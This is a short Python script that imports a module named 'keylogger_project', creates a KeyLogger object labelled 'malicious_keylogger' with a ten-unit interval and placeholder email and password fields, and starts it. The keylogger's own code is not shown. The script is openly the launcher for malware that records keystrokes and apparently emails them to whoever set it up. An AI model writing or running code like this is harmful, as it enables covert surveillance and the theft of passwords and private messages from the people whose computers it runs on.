import keylogger_project

# Initialize / create keylogger
malicious_keylogger = keylogger_project.KeyLogger(10, 'insert_email', 'insert_password')

# Execute Keylogger
malicious_keylogger.start()
